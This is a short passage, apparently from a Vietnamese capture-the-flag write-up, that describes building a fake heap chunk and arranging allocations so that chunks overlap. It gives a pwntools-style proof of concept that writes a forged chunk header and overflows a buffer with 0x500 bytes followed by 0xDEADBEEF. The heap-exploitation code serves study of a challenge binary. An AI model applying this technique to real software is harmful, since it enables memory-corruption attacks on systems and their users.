...
Mình cũng tạo fake chunk nhưng ngắn hơn guyintuxedo, feng shui cho overlap toàn bộ chunk là được, POC:
...
payload = p64(0) + p64(0x611)
p_sa(b"Chunk0 Contents:\n", payload)
p_sa(b"Chunk1 Contents:\n", b"A" * 8)
p_sla(b"Index?\n", f"{0x10}".encode())
p_sla(b"allocation?\n", f"{0x600}".encode())

payload = b"A" * 0x500 + p64(0xDEADBEEF)
p_sa(b"Contents.\n", payload)
